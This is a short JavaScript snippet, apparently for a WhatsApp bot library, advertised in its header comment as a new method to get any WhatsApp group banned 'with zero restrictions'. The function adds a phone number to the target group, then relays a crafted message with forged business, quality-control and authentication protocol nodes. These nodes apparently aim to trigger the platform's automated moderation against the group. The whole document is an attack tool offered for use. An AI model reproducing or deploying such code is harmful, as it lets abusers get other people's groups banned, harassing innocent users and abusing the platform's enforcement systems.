// New Meta to ban WhatsApp Group 99% Work With Zero Restrictions 


async function groupBan(sock, target) {
  if (!target.endsWith("@g.us")) throw "@g.us server required";
  try {
    await sock.groupParticipantsUpdate(target, ["13135550002@s.whatsapp.net"], "add")


const message = {
  messageContextInfo: {
    deviceListMetadata: {
      recipientKeyHash: "9O2/zrd/eSN9zQ==",
      recipientTimestamp: "1780007205"
    },
    deviceListMetadataVersion: 2
  },
  placeholderMessage: {
    type: "MASK_LINKED_DEVICES"
  }
}

await sock.relayMessage(
  target,
  message,
  {
    messageId: "MSG-" + Date.now(),

    additionalNodes: [
      {
        tag: "biz",
        attrs: {
          actual_actors: "2",
          host_storage: "2",
          privacy_mode_ts: "1752211793"
        },
        content: [
          {
            tag: "quality_control",
            attrs: {
              decision_id: "6a01f938cec6e2acc8eec82c1eab0630af9cc1e2",
              source_type: "third_party"
            },
            content: [
              {
                tag: "decision_source",
                attrs: { value: "df" }
              }
            ]
          },
          {
            tag: "auth",
            attrs: {
              disable_ios_autofill: "false"
            }
          }
        ]
      },
      {
        tag: "hsm",
        attrs: {
          tag: "AUTHENTICATION"
        }
      }
    ]
  }
) 

  } catch (e) {
    throw e
  }
}